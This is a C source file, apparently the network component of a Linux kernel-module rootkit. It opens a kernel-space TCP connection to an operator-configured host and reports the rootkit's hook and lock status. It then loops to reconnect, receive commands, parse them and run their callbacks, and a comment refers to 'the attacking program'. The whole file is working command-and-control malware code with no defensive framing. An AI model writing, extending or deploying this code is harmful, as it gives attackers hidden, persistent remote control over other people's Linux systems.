#include "network.h"

#include <linux/delay.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>

#include "commands.h"
#include "hook.h"
#include "lock.h"

static struct socket *sock = NULL;

static void *convert(void *ptr)
{
    return ptr;
}

int network_init(const char *ip, int port)
{
    struct sockaddr_in addr = { 0 };
    struct msghdr msg = { 0 };
    struct kvec vec = { 0 };
    char hide_lock_status[3] = { 0 };
    unsigned char ip_binary[4] = { 0 };
    int ret = 0;

    sprintf(hide_lock_status, "%d%d\n", hook_status(), lock_status());

    pr_info("network: initializing socket\n");

    if ((ret = in4_pton(ip, -1, ip_binary, -1, NULL)) == 0)
    {
        pr_err("network: error converting the IPv4 address: %d\n", ret);
        return 1;
    }

    if ((ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0)
    {
        pr_err("network: error creating the socket: %d\n", ret);
        return 1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

    if ((ret = sock->ops->connect(sock, convert(&addr), sizeof(addr), 0)) < 0)
    {
        pr_err("network: error connecting to %s:%d (%d)\n", ip, port, ret);
        sock_release(sock);
        sock = NULL;
        return 1;
    }

    vec.iov_base = hide_lock_status;
    vec.iov_len = 3;

    if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
    {
        pr_err("network: error sending the message: %d\n", ret);
        sock_release(sock);
        sock = NULL;
        return 1;
    }

    pr_info("network: message '%s' sent to %s:%d\n", hide_lock_status, ip, port);
    return 0;
}

#define NET_ERROR(msg)                                                         \
    printk(msg);                                                               \
    sock_release(sock);                                                        \
    sock = NULL;                                                               \
    continue;

int network_loop(void *data)
{
    int ret = 0;
    struct kvec resp_vec = { 0 };
    struct msghdr resp_msg = { 0 };
    char resp_buf[1024] = { 0 };
    struct kvec status_vec = { 0 };
    struct msghdr status_msg = { 0 };
    char status_buf[1024];
    struct config *cfg = data;
    struct command cmd;

    // handle response:
    while (kthread_should_stop() == 0)
    {
        resp_vec.iov_base = resp_buf;
        resp_vec.iov_len = 1023;

        if (!sock)
        {
            int r;
            while ((r = network_init(cfg->ip, cfg->port)) != 0
                   && kthread_should_stop() == 0)
            {
                /* pr_warn( */
                /*     "network: failed to init socket. trying again in 3s.\n");
                 */
                msleep(3000);
            }
        }

        if (kthread_should_stop() || !sock)
        {
            break;
        }

        ret = kernel_recvmsg(sock, &resp_msg, &resp_vec, 1, 1023, MSG_DONTWAIT);
        if (ret == -EAGAIN || ret == -EWOULDBLOCK)
        {
            /* pr_info("network: no data available. polling again in 1s...\n");
             */
            msleep(1000);
            continue;
        }
        if (ret < 0)
        {
            sprintf(status_buf,
                    "network: socket error: %d. re-initializing socket.\n",
                    ret);
            NET_ERROR(status_buf)
        }

        // don't print newline
        if (resp_buf[ret - 1] == '\n')
        {
            resp_buf[ret - 1] = '\0';
        }
        pr_info("network: received message:\n***************\n "
                "'%s'\n***************\n",
                resp_buf);

        if ((ret = cmd_build(&cmd, resp_buf)) != 0)
        {
            const char *errmsg = "network: couldn't parse payload into a "
                                 "supported command. dropping message.\n";
            sprintf(status_buf, "%s", errmsg);
            pr_err("%s", errmsg);
            status_vec.iov_base = status_buf;
            status_vec.iov_len = strlen(status_buf);

            if ((ret = kernel_sendmsg(sock, &status_msg, &status_vec, 1,
                                      status_vec.iov_len))
                < 0)
            {
                sprintf(status_buf,
                        "network: couldn't send status buffer back: %d\n", ret);
                NET_ERROR(status_buf)
            }
            memset(&resp_buf, 0, 1024);
            continue;
        }

        memset(&resp_buf, 0, 1024);
        /* WARNING: rootkit silently ignores commands when locked. It is up to
         * the attacking program to track locked state and prevent the user from
         * sending other commands types */
        if (lock_status() == LOCKED && cmd.type != CMD_UNLOCK)
        {
            pr_info("network: rootkit is locked, dropping command %d\n",
                    cmd.type);
            continue;
        }

        if ((ret = cmd.callback(sock, cmd.args) != 0))
        {
            if (ret != -1)
            {
                pr_err("network: command execution failed: %d\n", ret);
                continue;
            }
            sprintf(status_buf, "network: couldn't send command's result: %d\n",
                    ret);
            NET_ERROR(status_buf)
        }
        else
        {
            pr_info("network: command ran successfully.\n");
        }
    }
    return 0;
}

void network_exit(void)
{
    if (sock)
        sock_release(sock);
    pr_info("network: released socket\n");
}
